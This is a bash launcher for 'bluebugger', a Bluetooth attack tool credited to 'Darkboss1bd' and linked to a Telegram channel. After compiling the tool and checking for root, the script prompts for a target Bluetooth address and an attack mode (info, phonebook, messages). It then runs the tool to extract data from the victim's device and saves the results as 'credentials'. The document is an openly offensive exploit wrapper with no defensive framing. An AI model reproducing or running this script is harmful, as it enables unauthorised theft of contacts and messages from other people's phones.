# bin/bash

if [ ! -f "src/bluebugger" ]; then
    echo -e "\033[0;32mCompiling bluebugger..."
    make > /dev/null 2>&1
    echo -e "\033[0;31mChecking for root user..."
    sleep 0.3
else
    echo -e "\033[0;31mChecking for root user..."
    sleep 0.3
fi


if [[ $(id -u) -ne 0 ]] ; then 
   echo -e "\033[0;36mYou are Not Root! Please Run as root" ; exit 1 ; 
fi


mkdir -p /dev/bluetooth/rfcomm
mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
clear
VERMILION='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'

echo -e "${VERMILION}     TTIUEIYUTIYUTYOITRYOTROYITORYIOTR"
echo -e "${VERMILION}      JTYJTRIYITRYITRUYITRUYITRIYTRIYUI"
echo -e "${WHITE}          TRYIRTIYOUTRIOYUTIROYUIOTRUYITRYI"
echo -e "${WHITE}          JTRJITRJYITRJYITRJIYJTRIOYRPTYPTR "
echo -e "${GREEN}         TIEURTITRUYITUYOIPTRPYTRPOYIPOTRYP "
echo -e "${CYAN}                                         Made by: ${WHITE}Darkboss1bd"
echo -e "${CYAN}                                                 Version : 2.3"
echo -e "${WHITE}             ..................................................."
echo -e "${BLUE}             Telegram Channel : https://t.me/windowspremiumkey"
echo -e "${WHITE}             ..................................................."
echo -e "${WHITE}________________________________________________________________________________"
echo -e "${BLUE}         ＥＸＰＬＯＩＴ  ＢＬＵＥＴＯＯＴＨ  ＶＵＬＮＥＲＥＢＩＬＩＴＹ "
echo -e "${WHITE}________________________________________________________________________________"
echo -e "${GREEN}"
echo -e "${CYAN}"
read -p "SET A BLUETOOTH ADDRESS ====>" ADDR
echo -e "${VERMILION}"
read -p "SET ATTACK MODE(e.g info, phonebook, messages) ====>" MODE
echo -e "${WHITE}"
read -p "SET OUTPUT PATH ====>" P
./src/bluebugger -a $ADDR $MODE -c 2 -o $P
echo -e "${WHITE}[+] ${CYAN}All credentials are saved into >>${WHITE}$P"
